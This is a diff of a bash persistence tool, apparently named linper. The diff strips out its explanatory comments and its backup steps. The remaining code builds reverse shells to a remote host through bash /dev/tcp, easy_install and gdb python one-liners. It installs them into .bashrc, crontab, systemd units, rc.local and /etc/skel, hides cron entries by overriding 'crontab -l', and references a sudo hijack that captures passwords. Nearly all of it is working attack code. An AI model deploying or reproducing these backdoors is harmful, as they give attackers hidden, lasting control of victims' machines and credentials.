@@ -1,8 +1,5 @@
 #!/bin/bash
 
-# The basic idea is that you have commands that can execute reverse shells (methods, e.g. bash) and ways to make those shells persist on the system (doors, e.g. crontab)
-# The script will enumerate all methods available and for each, enumerate all doors
-
 CLEAN=0
 CLEANCRONTMP=$(mktemp)
 CLEANSYSMSG=0
@@ -98,10 +95,6 @@ then
 				TMPSERVICE=.$(mktemp -u | sed 's/.*\.//g').service
 				TMPSERVICESHELLSCRIPT=.$(mktemp -u | sed 's/.*\.//g').sh
 				
-				# For crontab, I can either do the carriage return trick
-				# echo -e "* * * * * echo task\rno crontab for $USER" | crontab
-				# or use the bashrc to "hijack" "crontab -l" to list everything but ours
-				# for the carriage return trick, remember you may have to count columns to properly fill space
 				echo 'function crontab () {
 				REALBIN="$(which crontab)"
 				if $(echo "$1" | grep -qi "\-l");
@@ -131,11 +124,6 @@ then
 fi
 
 METHODS=(
-	# array entry format = method, eval statement, payload: <- the ":" is important, and the spaces around the commas
-	# method = command that starts the reverse shell
-	# eval statement = if return true, then we can do what we want with the command
-	# NOTE: the eval statement is meant to account for the times where you can execute a command, therefore the exit status = 0 but the command itself prevents you from doing what you want (e.g. you can excute easy_install as any user but only install things as root [by default], and you can install a persistence script)
-	# payload = just the bare minimum to run the reverse shell, the extra needed to install the payload somewhere (e.g. cron schedule) is handled in "doors"
 	"bash , bash -c 'exit' , bash -c 'bash -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'?"
 	"easy_install , echo 'import sys,socket,os,pty;exit()' > $EZID/setup.py; easy_install $EZID 2> /dev/null &> /dev/null , echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' > $EZID/setup.py; easy_install $EZID?"
 	"gdb , gdb -nx -ex 'python import sys,socket,os,pty;exit()' &> /dev/null , echo 'c' | gdb -nx -ex 'python import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' -ex quit &> /dev/null?"
@@ -182,18 +170,13 @@ enum_methods() {
 
 }
 
-# enumerate where all backdoors can be placed
 enum_doors() {
 
 	DOORS=(
-		# array entry format = door , eval statement , hinge: <- the "?" is important, and the spaces around the commas
-		# door = command
-		# eval statement = same as above
-		# hinge = door hinge, haha get it? it is the command to actually be executed (piped to $SHELL) in order to install the backdoor, for each method. It will contain everything needed for the door to function properly (e.g. cron schedule, service details, backgrounding for bashrc, etc). The persistence *hinges* on this to be syntactically correct, literally :)
-		"bashrc , touch ~/.bashrc , cp ~/.bashrc ~/.bashrc.bak; echo \"$PAYLOAD 2> /dev/null 1>&2 & sleep .0001\" >> ~/.bashrc?"
+		"bashrc , touch ~/.bashrc , echo \"$PAYLOAD 2> /dev/null 1>&2 & sleep .0001\" >> ~/.bashrc?"
 		"crontab , crontab -l > $TMPCRON; echo \"* * * * * echo linper\" >> $TMPCRON; crontab $TMPCRON; crontab -l > $TMPCRON; cat $TMPCRON | grep -v linper > $PERMACRON; crontab $PERMACRON; if grep -qi [A-Za-z0-9] $PERMACRON; then crontab $PERMACRON; else crontab -r; fi; grep linper -qi $TMPCRON , echo \"$CRON $PAYLOAD\" >> $PERMACRON; crontab $PERMACRON && rm $PERMACRON?"
 		"systemctl , find /etc/systemd/ -type d -writable | head -n 1 | grep -qi systemd , echo \"$PAYLOAD\" >> /etc/systemd/system/$TMPSERVICESHELLSCRIPT; if test -f /etc/systemd/system/$TMPSERVICE; then echo > /dev/null; else touch /etc/systemd/system/$TMPSERVICE; echo \"[Service]\" >> /etc/systemd/system/$TMPSERVICE; echo \"Type=oneshot\" >> /etc/systemd/system/$TMPSERVICE; echo \"ExecStartPre=$(which sleep) 60\" >> /etc/systemd/system/$TMPSERVICE; echo \"ExecStart=$(which $SHELL) /etc/systemd/system/$TMPSERVICESHELLSCRIPT\" >> /etc/systemd/system/$TMPSERVICE; echo \"ExecStartPost=$(which sleep) infinity\" >> /etc/systemd/system/$TMPSERVICE; echo \"[Install]\" >> /etc/systemd/system/$TMPSERVICE; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$TMPSERVICE; chmod 644 /etc/systemd/system/$TMPSERVICE; systemctl start $TMPSERVICE 2> /dev/null & sleep .0001; systemctl enable $TMPSERVICE 2> /dev/null & sleep .0001; fi;?"
-		"/etc/rc.local , uname -a | grep -q -e Linux -e OpenBSD && find /etc/ -writable -type f 2> /dev/null | grep -q etc , if test -f /etc/rc.local; then cp /etc/rc.local /etc/.rc.local.bak; LINES=\$(expr \`cat /etc/rc.local | wc -l\` - 1); cat /etc/rc.local | head -n \$LINES > $TMPRCLOCAL; echo \"$PAYLOAD\" >> $TMPRCLOCAL; echo \"exit 0\" >> $TMPRCLOCAL; mv $TMPRCLOCAL /etc/rc.local; else echo \"#!/bin/sh -e\" > /etc/rc.local; echo $PAYLOAD >> /etc/rc.local; echo \"exit 0\" >> /etc/rc.local; fi; chmod +x /etc/rc.local?"
+		"/etc/rc.local , uname -a | grep -q -e Linux -e OpenBSD && find /etc/ -writable -type f 2> /dev/null | grep -q etc , if test -f /etc/rc.local; then LINES=\$(expr \`cat /etc/rc.local | wc -l\` - 1); cat /etc/rc.local | head -n \$LINES > $TMPRCLOCAL; echo \"$PAYLOAD\" >> $TMPRCLOCAL; echo \"exit 0\" >> $TMPRCLOCAL; mv $TMPRCLOCAL /etc/rc.local; else echo \"#!/bin/sh -e\" > /etc/rc.local; echo $PAYLOAD >> /etc/rc.local; echo \"exit 0\" >> /etc/rc.local; fi; chmod +x /etc/rc.local?"
 		"/etc/skel/.bashrc , find /etc/skel/.bashrc -writable | grep -q bashrc , echo \"$PAYLOAD 2> /dev/null 1>&2 & sleep .0001\" >> /etc/skel/.bashrc?"
 	)
 
@@ -296,7 +279,6 @@ shadow() {
 
 cleanup() {
 
-	# remove --stealth-mode modifications
 	if $(grep -qi $1 ~/.bashrc) && $(grep -qi "function crontab" ~/.bashrc) && $(grep -qi REALBIN ~/.bashrc);
 	then
 		cat ~/.bashrc | sed '1,/function crontab/!d' | grep -v "function crontab" > $TMPCLEANBASHRC
@@ -304,7 +286,6 @@ cleanup() {
 		echo -e "\e[92m[+]\e[0m Removed crontab function from bashrc"
 	fi
 
-	# removed sudo hijack
 	if $(grep -qi $1 ~/.bashrc) && $(grep -qi "function sudo" ~/.bashrc) && $(grep -qi REALSUDO ~/.bashrc) && $(grep -qi PASSWDFILE ~/.bashrc);
 	then
 		cat ~/.bashrc | sed '1,/function sudo/!d' | grep -v "function sudo" > $TMPCLEANBASHRC
@@ -312,7 +293,6 @@ cleanup() {
 		echo -e "\e[92m[+]\e[0m Removed sudo function from bashrc"
 	fi
 
-	# remove from bashrc
 	if $(cat ~/.bashrc | grep -q $1);
 	then
 		grep --color=never -v $1 ~/.bashrc > $TMPCLEANBASHRC
@@ -320,7 +300,6 @@ cleanup() {
 		echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from ~/.bashrc"
 	fi
 
-	# remove from crontab
 	CRONBINARY=$(which crontab)
 	if $($CRONBINARY -l 2> /dev/null | grep -q $1);
 	then
@@ -328,7 +307,6 @@ cleanup() {
 		echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from crontab"
 	fi
 
-	# this removes both the .service and .sh files
 	for i in $(find /etc/systemd/ -writable -type f 2> /dev/null);
 	do
 		grep -q $1 $i 2> /dev/null
@@ -352,7 +330,6 @@ cleanup() {
 		echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from systemctl"
 	fi
 
-	# remove from /etc/skel/.bashrc and /etc/rc.local
 	if $(cat /etc/rc.local 2> /dev/null | grep -q $1);
 	then
 		grep --color=never -v $1 "/etc/rc.local" > $TMPCLEANRCLOCAL
@@ -371,8 +348,6 @@ cleanup() {
 		echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from /etc/skel/.bashrc"
 	fi
 	
-	# remove from webserver, need to finish the install part first
-
 }
 
 main() {
